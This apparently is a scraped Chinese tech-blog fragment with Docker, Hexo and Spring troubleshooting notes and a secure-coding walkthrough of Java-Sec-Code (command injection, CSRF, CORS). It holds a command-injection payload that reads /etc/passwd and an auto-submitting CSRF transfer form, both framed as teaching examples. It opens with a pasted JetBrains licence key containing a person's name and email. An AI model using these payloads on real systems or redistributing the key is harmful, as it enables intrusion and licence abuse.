12NXHAY2OW76-eyJsaWNlbnNlSWQiOiJOWEhBWTJPVzc2IiwibGljZW5zZWVOYW1lIjoiSHVuYW4gSW5zdGl0dXRlIG9mIFNjaWVuY2UgYW5kIFRlY2hub2xvZ3kiLCJhc3NpZ25lZU5hbWUiOiJ6b2xhIGdhcm1zIiwiYXNzaWduZWVFbWFpbCI6InpvbGFfZ2FybXNAaG90bWFpbC5jb20iLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiJGb3IgZWR1Y2F0aW9uYWwgdXNlIG9ubHkiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IkRQTiIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiREIiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJJSSIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUlNDIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkdPIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUlNGIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkRTIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQQyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUkMiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkNMIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJXUyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUkQiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTMCIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUk0iLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkFDIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJSU1YiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiREMiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTVSIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiRFAiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUERCIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBXUyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU0kiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBHTyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUEMiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFJCIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTVyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJSUyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjp0cnVlfV0sIm1ldGFkYXRhIjoiMDEyMDIzMDIwN0xQQUEwMDkwMDkiLCJoYXNoIjoiNDI1NDk2NzkvMjAxMDIwNTY6LTE5MTk3NjU2NzciLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-jld9RLG5lScm+JPCOjY2bVd6Q+EC9HRx2ZAYKm+ySUHk7VqxJ8yvO+RNcgX/s1HiS1HuAqYgkUqNHXzwFS2TbyaDXw27fZk3F8oCvkdYpItKzMx6IRJ4NNffGGAC5U6culHEAWgNPHpQA3Q6Mw34Cz/19P7syAwTMcy3xCDYWII29+gS9LI9I3/HosfI8qLJSDSGrhOfXtHKKEXIg4QguDU13p897IN5u5CNOhXjAu4oKU+ELWBjeIUBS/fkdrDM56JU5hhKKs3JNJ53VPbWSnP2Uhs/isLP9M1UF6rTgY/reCreWvwEsyG0PVadcvr/lydiKi4+FkX/yZIzVOR4aA==-MIIETDCCAjSgAwIBAgIBDzANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIyMTAxMDE2MDU0NFoXDTI0MTAxMTE2MDU0NFowHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMjEwMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC/W3uCpU5M2y48rUR/3fFR6y4xj1nOm3rIuGp2brELVGzdgK2BezjnDXpAxVDw5657hBkAUMoyByiDs2MgmVi9IcqdAwpk988/Daaajq9xuU1of59jH9eQ9c3BmsEtdA4boN3VpenYKATwmpKYkJKVc07ZKoXL6kSyZuF7Jq7HoQZcclChbF75QJPGbri3cw9vDk/e46kuzfwpGftvl6+vKibpInO6Dv0ocwImDbOutyZC7E+BwpEm1TJZW4XovMBegHhWC04cJvpH1u98xoR94ichw0jKhdppywARe43rGU96163RckIuFmFDQKZV9SMUrwpQFu4Z2D5yTNqnlLRfAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQU5FZqQ4gnVc+inIeZF+o3ID+VhcEwSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBANLG1anEKid4W87vQkqWaQTkRtFKJ2GFtBeMhvLhIyM6Cg3FdQnMZr0qr9mlV0w289pf/+M14J7S7SgsfwxMJvFbw9gZlwHvhBl24N349GuthshGO9P9eKmNPgyTJzTtw6FedXrrHV99nC7spaY84e+DqfHGYOzMJDrg8xHDYLLHk5Q2z5TlrztXMbtLhjPKrc2+ZajFFshgE5eowfkutSYxeX8uA5czFNT1ZxmDwX1KIelbqhh6XkMQFJui8v8Eo396/sN3RAQSfvBd7Syhch2vlaMP4FAB11AlMKO2x/1hoKiHBU3oU3OKRTfoUTfy1uH3T+t03k1Qkr0dqgHLxiv6QU5WrarR9tx/dapqbsSmrYapmJ7S5+ghc4FTWxXJB1cjJRh3X+gwJIHjOVW+5ZVqXTG2s2Jwi2daDt6XYeigxgL2SlQpeL5kvXNCcuSJurJVcRZFYUkzVv85XfDauqGxYqaehPcK2TzmcXOUWPfxQxLJd2TrqSiO+mseqqkNTb3ZDiYS/ZqdQoGYIUwJqXo+EDgqlmuWUhkWwCkyo4rtTZeAj+nP00v3n8JmXtO30Fip+lxpfsVR3tO1hk4Vi2kmVjXyRkW2G7D7WAVt+91ahFoSeRWlKyb4KcvGvwUaa43fWLem2hyI4di2pZdr3fcYJ3xvL5ejL3m14bKsfoOv Docker启动mysql报错mysql镜像运行报错： docker: Error response from daemon: No command specified. 在运行命令后加&#x2F;bin&#x2F;bash，应该该镜像是导出的不是直接从仓库下载的。 当通过下列命令启动mysql时报错 1docker run -itd -p 3306:3306 --name sample-mysql -e MYSQL_ROOT_PASSWORD=123456 -v /mydata/mysql/log:/var/log/mysql -v /mydata/mysql/data:/var/lib/mysql -v /mydata/mysql/conf:/etc/mysql -d mysql:8.0 解决方案 是由于命令没启用的缘故，所以需要在运行命令后面追加 &#x2F;bin&#x2F;bash 1docker run -itd -p 3306:3306 --name sample-mysql -e MYSQL_ROOT_PASSWORD=123456 -v /mydata/mysql/log:/var/log/mysql -v /mydata/mysql/data:/var/lib/mysql -v /mydata/mysql/conf:/etc/mysql -d mysql:8.0 /bin/bash 问题解决。 docker启动mysql，启动后迅速关闭在启动docker镜像指令中没有加 1-itd -i（–interactive）： 允许你与容器进行交互。这通常涉及到在容器内部启动一个终端。 -t（–tty）： 分配一个伪终端（pseudo-TTY）。这允许你在终端中执行命令。 -d（–detach）： 在后台运行容器。即使你关闭了终端，容器也会继续运行。 综合起来，-itd的组合允许你在后台运行一个容器，并且仍然能够与容器进行交互。这对于在生产环境中运行容器时非常有用，因为你可以在后台运行它们，同时仍然能够与容器进行通信，查看日志，或者执行其他管理任务。 加了才会正常运行，完整的指令为： 1docker run -itd -p 3306:3306 --name sample-mysql -e MYSQL_ROOT_PASSWORD=123456 -v /mydata/mysql/log:/var/log/mysql -v /mydata/mysql/data:/var/lib/mysql -v /mydata/mysql/conf:/etc/mysql -d mysql:8.0 /bin/bash docker使用openjdk镜像携带一个jar包启动容器报错执行的命令： 1docker run -d -p 8881:8081 -v /usr/local/javaseccode:/usr/local/javaseccode --name javaseccode_dongtai openjdk:8u252 java -javaagent:/usr/local/iast/javaseccode/dongtai_agent.jar -jar /usr/local/java-sec-code-1.0.0.jar 报错信息： 1Unable to access jarfile java-sec-code-1.0.0.jar 命令解释1234567docker run #启动一个新的容器；-d #在后台（守护进程）运行容器；-p 8881:8081 #将主机的8881端口映射到容器内的8081端口；-v /usr/local/javaseccode:/usr/local/javaseccode #将主机上的&#x27;/usr/local/javaseccode&#x27;目录映射到容器内的&#x27;/usr/local/javaseccode&#x27;目录，实现主机和容器之间的文件共享；--name javaseccode_dongtai #将容器命名为该名称；openjdk:8u252 #使用的Docker镜像名称；java -javaagent:/usr/local/iast/dongtai_agent.jar -jar /usr/local/java-sec-code-1.0.0.jar 在容器中执行的java命令，包含javaagent的陆景和要执行的jar文件路径。 问题发现经过排查，发现是启动容器后，在容器内执行java命令时，找不到对应的jar包。排查是否是目录映射出了问题。 修改命令为： 1docker run -d -p 8881:8081 -v /usr/local:/usr/local --name javaseccode_dongtai openjdk:8u252 java --javaagent:/usr/local/iast/javaseccode/dongtai_agent.jar -jar /usr/local/java-sec-code-1.0.0.jar 将&#x2F;usr&#x2F;local目录映射到容器内，然而仍然报错，尝试改变思路，将该jar包放在&#x2F;usr&#x2F;local&#x2F;javaseccode目录中，再次映射： 1docker run -d -p 8881:8081 -v /usr/local/javaseccode:/usr/local/javaseccode --name javaseccode_dongtai openjdk:8u252 java -javaagent:/usr/local/iast/javaseccode/dongtai_agent.jar -jar /usr/local/javaseccode/java-sec-code-1.0.0.jar 问题解决。 Hexo文章图片无法加载Hexo侧首先确认根目录_config.yml中有: 1post_asset_folder: true 然后在hexo所在根目录，启动git bash终端下执行 1npm install https://github.com/CodeFalling/hexo-asset-image --save 该指令的目的是下载0.0.5版本的hexo-asset-image，1.0.0版本实测无法正常加载图片。 Typora侧在设置中，将图片的保存设置修改为： 完成。现在图片可以正常显示。 Springboot项目中@Value注解无法正常注入原代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package com.erickin.Util;import io.jsonwebtoken.Claims;import io.jsonwebtoken.Jwts;import io.jsonwebtoken.SignatureAlgorithm;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Configurable;import org.springframework.beans.factory.annotation.Value;import org.springframework.stereotype.Component;import org.springframework.stereotype.Service;import org.springframework.util.StringUtils;import javax.annotation.PostConstruct;import java.util.Date;import java.util.Map;@Slf4j@Componentpublic class JwtUtils &#123; @Value(&quot;$&#123;jwt.signKey&#125;&quot;) static String signKey; @Value(&quot;$&#123;jwt.expire&#125;&quot;) static Long expireTime; /** * 生成Jwt * @param claims * @return */ public static String generateJwt(Map&lt;String, Object&gt; claims)&#123; log.info(&quot;==================generateJwt方法开始执行&quot;); log.info(&quot;==================signKey:&#123;&#125;, expireTime:&#123;&#125;&quot;, signKey, expireTime); if(signKey == null || signKey == &quot;&quot;)&#123; log.info(&quot;signKey注入失败&quot;); signKey = &quot;errorHappened&quot;; &#125; if(expireTime == null)&#123; log.info(&quot;expireTime注入失败&quot;); expireTime = 10000000000L; &#125; String jwt = Jwts.builder() .addClaims(claims) .signWith(SignatureAlgorithm.HS256, signKey) .setExpiration(new Date(System.currentTimeMillis() + expireTime)) .compact(); return jwt; &#125; /** * 解析Jwt * @param jwt * @return */ public static Claims parseJwt(String jwt)&#123; if(signKey == null || signKey == &quot;&quot;)&#123; log.info(&quot;signKey注入失败&quot;); signKey = &quot;errorHappened&quot;; &#125; if(expireTime == null)&#123; log.info(&quot;expireTime注入失败&quot;); expireTime = 10000000000L; &#125; Claims claims = Jwts.parser() .setSigningKey(signKey) .parseClaimsJws(jwt) .getBody(); return claims; &#125;&#125; 解决步骤 由于Springboot实例化的顺序问题，@Value注解不能加在静态属性和方法中，静态属性会最先初始化并赋值，先于@Value； 修改后发现仍然无法正常注入，发现是类上需要加@Component注解，使其随着Springboot实例化； 修改后仍然发现无法注入，在使用到该类的类中，通过@Autowired注入类的实例，最终解决了问题。 总结 @value不能加在静态属性上； 如果类中使用了@Value，需要在类上加上@Component； 在使用该方法的类中，通过@Autowired实例化。","categories":[{"name":"其他","slug":"其他","permalink":"https://erickinyae.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[]},{"title":"Java-Sec-Code","slug":"Java-Sec-Code","date":"2023-11-13T07:49:13.000Z","updated":"2023-11-27T07:16:55.720Z","comments":true,"path":"2023/11/13/Java-Sec-Code/","permalink":"https://erickinyae.github.io/2023/11/13/Java-Sec-Code/","excerpt":"","text":"Command Inject错误示例123456789@GetMapping(&quot;/codeinject&quot;) public String codeInject(String filepath) throws IOException &#123; String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); return WebUtils.convertStreamToString(process.getInputStream()); &#125; 在该代码中，get请求可以携带一个参数filepath，但方法并未对filepath做任何过滤操作而直接进行字符串拼串进行执行，从而会导致代码注入； 注入的方法是在原有的语句结尾，添加一个 ;，从而再接上一段语句进行执行； 注入方法1http://localhost:8080/codeinject?filepath=/tmp;cat /etc/passwd 该请求将导致ls -la /tmp; cat /etc/passwd执行。 sh -c的意思是调取命令执行窗口执行命令。 安全代码12345678@GetMapping(&quot;/codeinject&quot;) public String codeInject(String filepath) throws IOException &#123; ProcessBuilder builder = new ProcessBuilder(); builder.command(&quot;ls&quot;, &quot;-la&quot;, filepath); builder.redirectErrorStream(true); Process process = builder.start(); return WebUtils.convertStreamToString(process.getInputStream()); &#125; 用户输入被添加到ProcessBuilder的命令列表中，而不是直接插入到命令字符串中。ProcessBuilder会处理参数的转义和引用，确保它们在系统命令中被正确解释； 如果用户输入包含空格等特殊字符，ProcessBuilder会负责正确处理，而不会使它们被错误地解释为命令的一部分。这有助于防止命令注入攻击。 总体而言，使用ProcessBuilder并正确处理命令和参数是防范命令注入的一种有效方式； 123456789private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\\\.-]+$&quot;);// SecurityUtil.javapublic static String cmdFilter(String input) &#123; if (!FILTER_PATTERN.matcher(input).matches()) &#123; return null; &#125; return input; &#125; 123456789101112@GetMapping(&quot;/codeinject&quot;) public String codeInject(String filepath) throws IOException &#123; String filterFilePath = SecurityUtil.cmdFilter(filepath); if (null == filterFilePath) &#123; return &quot;Bad boy. I got u.&quot;; &#125; String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); return WebUtils.convertStreamToString(process.getInputStream()); &#125; 通过对字符串进行过滤也能有效处理代码注入问题。 CORS ? https://github.com/JoyChou93/java-sec-code/wiki/CORS CORS（跨域资源共享）是一种用于在浏览器和服务器之间进行跨域通信的机制。当在浏览器中执行Web页面时，由于安全原因，浏览器限制了从一个域（Origin）加载的网页能够请求另一个域上的资源。跨域请求是指在浏览器的同一页面中，从一个域的JavaScript代码尝试请求另一个域的资源，例如，从http://domain-a.com的页面尝试向http://domain-b.com发起请求。 详细解释：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS CSRFCSRF（Cross-Site Request Forgery）是一种网络安全漏洞，也被称为XSRF或Sea-Surf。这种攻击利用了用户当前已认证的会话来执行未经用户许可的操作。攻击者通过欺骗用户的浏览器，使其发送伪造的请求，以执行可能是恶意的操作，而用户并不知情。 攻击过程通常包括以下步骤： 用户登录一个网站并获取了相应的认证令牌（比如，通过Cookie或其他方式）。 用户使用其凭证（用户名和密码）登录银行应用程序。在登录成功后，服务器将颁发一个包含会话标识的Cookie，以便在之后的请求中进行身份验证。 攻击者制作一个包含恶意请求的网页，并诱使用户访问。 攻击者创建一个恶意网页，其中包含一个隐藏的表单，该表单会触发银行转账操作。 1234567891011121314&lt;html&gt;&lt;body&gt; &lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;toAccount&quot; value=&quot;attackerAccount&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;1000000&quot; /&gt; &lt;!-- CSRF Token is missing --&gt; &lt;/form&gt; &lt;script&gt; // JavaScript to submit the form when the page loads document.forms[0].submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 攻击者通过各种手段诱导用户访问恶意网页，例如通过社交工程、恶意广告、或者通过发送包含恶意链接的电子邮件。 用户在未察觉的情况下，浏览器会发送已认证的请求，因为浏览器会自动包含在用户登录时获取的认证令牌。 用户在未察觉的情况下访问了恶意网页。由于用户已经登录了银行应用程序，浏览器会自动发送之前获取的银行Cookie，包括会话标识。 银行服务器接收到来自用户浏览器的请求，由于缺少Anti-CSRF Token，服务器无法判断该请求是否是合法的。服务器会处理请求，执行转账操作，因为它认为这是一个合法的、已经经过身份验证的请求。 攻击者成功执行恶意操作，而用户毫不知情。 由于服务器没有有效地验证请求的合法性，银行服务器会执行转账操作，将资金从用户账户转移到攻击者指定的账户（在这个例子中是attackerAccount）。 漏洞代码1234567@GetMapping(&quot;/vuln/origin&quot;)public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123; String origin = request.getHeader(&quot;origin&quot;); response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); // allow cookie return info;&#125; 这段代码存在一个安全漏洞，即未进行足够的验证就直接使用请求头中的 origin 设置了 Access-Control-Allow-Origin 头。这可能导致安全问题，尤其是在处理跨域资源共享（CORS）时，需要仔细验证请求的 origin。 任意 Origin 头问题： 直接使用请求头中的 origin 设置 Access-Control-Allow-Origin 头，意味着你信任任何来源域，这可能导致安全风险。 CSRF攻击： 如果攻击者能够伪造请求并设置任意 Origin 头，就有可能绕过浏览器的同源策略，向服务器发送未经授权的请求。 安全代码1234567891011121314151617181920212223@GetMapping(&quot;/secure&quot;)public String secureEndpoint(HttpServletRequest request, HttpServletResponse response) &#123; // 获取请求头中的 Origin String origin = request.getHeader(&quot;Origin&quot;); // 验证 Origin 是否在白名单中 if (isValidOrigin(origin)) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); return info; &#125; else &#123; // 处理非法请求，可以记录日志、抛出异常或者采取其他适当的措施 return &quot;Invalid Request&quot;; &#125;&#125;private boolean isValidOrigin(String origin) &#123; // 实现验证逻辑，检查 Origin 是否在白名单中 // 可以使用白名单、正则表达式等进行验证 // 返回 true 表示 Origin 在白名单中，允许访问；返回 false 表示非法 Origin，需要处理 // 这里只是一个示例，实际情况根据具体需求进行实现 return whitelist.contains(origin);&#125; Cors.checkOrigin 用注释配置允许的Origin域名 12345678910/** * 重写Cors的checkOrigin校验方法 * 支持自定义checkOrigin，让其额外支持一级域名 * 代码：org/joychou/security/CustomCorsProcessor */@CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)@GetMapping(&quot;/sec/crossOrigin&quot;)public String secCrossOrigin() &#123; return info;&#125; CustomCorsProcessor.java 12345678910111213141516171819202122232425262728293031323334353637383940414243public class CustomCorsProcessor extends DefaultCorsProcessor &#123; private static final Logger logger = LoggerFactory.getLogger(CustomCorsProcessor.class); /** * 跨域请求，会通过此方法检测请求源是否被允许 * * @param config CORS 配置 * @param requestOrigin 请求源 * @return 如果请求源被允许，返回请求源；否则返回 null */ @Override protected String checkOrigin(CorsConfiguration config, String requestOrigin) &#123; // super -&gt; 支持checkOrigin原装的域名配置 String result = super.checkOrigin(config, requestOrigin); if (result != null) &#123; return result; &#125; if (StringUtils.isBlank(requestOrigin)) &#123; return null; &#125; //自定义Origin域名检测配置 return customCheckOrigin(requestOrigin); &#125; /** * 自定义校验requestOrigin */ private String customCheckOrigin(String requestOrigin) &#123; if ( SecurityUtil.checkURL(requestOrigin) != null) &#123; logger.info(&quot;[+] Origin: &quot; + requestOrigin ); return requestOrigin; &#125; logger.error(&quot;[-] Origin: &quot; + requestOrigin ); return null; &#125;&#125; spring security利用spring security框架配置csrf防范策略。 WebSecurityConfig.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118package org.joychou.security;import *;/** * Congifure csrf * */@EnableWebSecurity@Configurationpublic class WebSecurityConfig extends WebSecurityConfigurerAdapter &#123; @Value(&quot;$&#123;joychou.security.csrf.enabled&#125;&quot;) private Boolean csrfEnabled = false; @Value(&quot;$&#123;joychou.security.csrf.exclude.url&#125;&quot;) private String[] csrfExcludeUrl; @Value(&quot;$&#123;joychou.no.need.login.url&#125;&quot;) private String[] noNeedLoginUrl; @Value(&quot;$&#123;joychou.security.csrf.method&#125;&quot;) private String[] csrfMethod = &#123;&quot;POST&quot;&#125;; private RequestMatcher csrfRequestMatcher = new RequestMatcher() &#123; @Override public boolean matches(HttpServletRequest request) &#123; // 配置需要CSRF校验的请求方式， HashSet&lt;String&gt; allowedMethods = new HashSet&lt;&gt;(Arrays.asList(csrfMethod)); // return false表示不校验csrf if (!csrfEnabled) &#123; return false; &#125; return allowedMethods.contains(request.getMethod()); &#125; &#125;; @Override protected void configure(HttpSecurity http) throws Exception &#123; // 默认token存在session里，用CookieCsrfTokenRepository改为token存在cookie里。 // 但存在后端多台服务器情况，session不能同步的问题，所以一般使用cookie模式。 http.csrf() .requireCsrfProtectionMatcher(csrfRequestMatcher) .ignoringAntMatchers(csrfExcludeUrl) // 不进行csrf校验的uri，多个uri使用逗号分隔 .csrfTokenRepository(new CookieCsrfTokenRepository()); http.exceptionHandling().accessDeniedHandler(new CsrfAccessDeniedHandler()); // http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()); http.cors(); // spring security login settings http.authorizeRequests() .antMatchers(noNeedLoginUrl).permitAll() // no need to login page // CVE-2022-22978漏洞代码 .regexMatchers(&quot;/black_path.*&quot;).denyAll() // 如果正则匹配到/black_path，则forbidden .anyRequest().authenticated().and() // any request authenticated except above static resources .formLogin().loginPage(&quot;/login&quot;).permitAll() // permit all to access /login page .successHandler(new LoginSuccessHandler()) .failureHandler(new LoginFailureHandler()).and() .logout().logoutUrl(&quot;/logout&quot;).permitAll().and() // tomcat默认JSESSION会话有效时间为30分钟，所以30分钟不操作会话将过期。为了解决这一问题，引入rememberMe功能。 .rememberMe(); &#125; /** * Global cors configure */ @Bean CorsConfigurationSource corsConfigurationSource() &#123; // Set cors origin white list ArrayList&lt;String&gt; allowOrigins = new ArrayList&lt;&gt;(); allowOrigins.add(&quot;joychou.org&quot;); allowOrigins.add(&quot;https://test.joychou.me&quot;); // 区分http和https，并且默认不会拦截同域请求。 CorsConfiguration configuration = new CorsConfiguration(); configuration.setAllowedOrigins(allowOrigins); configuration.setAllowCredentials(true); configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;)); UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(&quot;/cors/sec/httpCors&quot;, configuration); // ant style return source; &#125; @Autowired public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception &#123; auth .inMemoryAuthentication() .withUser(&quot;joychou&quot;).password(&quot;joychou123&quot;).roles(&quot;USER&quot;).and() .withUser(&quot;admin&quot;).password(&quot;admin123&quot;).roles(&quot;USER&quot;, &quot;ADMIN&quot;); &#125;&#125;public class CsrfAccessDeniedHandler implements AccessDeniedHandler &#123; protected final Logger logger= LoggerFactory.getLogger(this.getClass()); @Override public void handle(HttpServletRequest request, HttpServletResponse response, AccessDeniedException accessDeniedException) throws IOException &#123; logger.info(&quot;[-] URL: &quot; + request.getRequestURL() + &quot;?&quot; + request.getQueryString() + &quot;\\t&quot; + &quot;Referer: &quot; + request.getHeader(&quot;referer&quot;)); response.setContentType(MediaType.TEXT_HTML_VALUE); // content-type: text/html response.setStatus(HttpServletResponse.SC_FORBIDDEN); // 403 forbidden response.getWriter().write(&quot;403 forbidden by JoyChou.&quot;); // response contents &#125;&#125; filterOriginFilter.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package org.joychou.filter;import *;/** * 推荐使用该全局方案修复Cors跨域漏洞，因为可以校验一级域名。 * * @author JoyChou @ 2019.12.19 */@WebFilter(filterName = &quot;OriginFilter&quot;, urlPatterns = &quot;/cors/sec/originFilter&quot;)public class OriginFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; private final Logger logger = LoggerFactory.getLogger(this.getClass()); @Override public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletRequest request = (HttpServletRequest) req; HttpServletResponse response = (HttpServletResponse) res; String origin = request.getHeader(&quot;Origin&quot;); logger.info(&quot;[+] Origin: &quot; + origin + &quot;\\tCurrent url:&quot; + request.getRequestURL()); // 以file协议访问html，origin为字符串的null，所以依然会走安全check逻辑 if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123; logger.error(&quot;[-] Origin check error. &quot; + &quot;Origin: &quot; + origin + &quot;\\tCurrent url:&quot; + request.getRequestURL()); response.setStatus(response.SC_FORBIDDEN); response.getWriter().println(&quot;Invaid cors config by joychou.&quot;); return; &#125; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); response.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, OPTION&quot;); filterChain.doFilter(req, res); &#125; @Override public void destroy() &#123; &#125;&#125; BaseCorsFilter123456789101112131415161718192021222324252627282930package org.joychou.filter;import *;/** * 由于CorsFilter和spring security冲突，所以改为下面的代码。 */@Component@Order(Ordered.HIGHEST_PRECEDENCE)public class BaseCorsFilter extends CorsFilter &#123; public BaseCorsFilter() &#123; super(configurationSource()); &#125; private static UrlBasedCorsConfigurationSource configurationSource() &#123; CorsConfiguration config = new CorsConfiguration(); config.setAllowCredentials(true); config.addAllowedOrigin(&quot;joychou.org&quot;); // 不支持 config.addAllowedOrigin(&quot;http://test.joychou.me&quot;); config.addAllowedHeader(&quot;*&quot;); config.addAllowedMethod(&quot;GET&quot;); config.addAllowedMethod(&quot;POST&quot;); UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(&quot;/cors/sec/corsFilter&quot;, config); return source; &#125;&#125; Deserialize序列化漏洞是指在应用程序中使用对象序列化（将对象转换为字节流以进行传输或存储）时，由于缺乏适当的安全措施而导致的安全风险。这种漏洞可能允许攻击者注入恶意的序列化数据，从而导致应用程序执行未经授权的操作。序列化漏洞通常涉及到不安全的反序列化实现，攻击者可以通过构造特殊的序列化数据来执行恶意代码。 以下是序列化漏洞的一般原理和过程： 反序列化过程： 在反序列化过程中，应用程序将字节流转换回对象。这个过程涉及到读取字节流，还原对象的状态，并在内存中创建对象。 未验证输入： 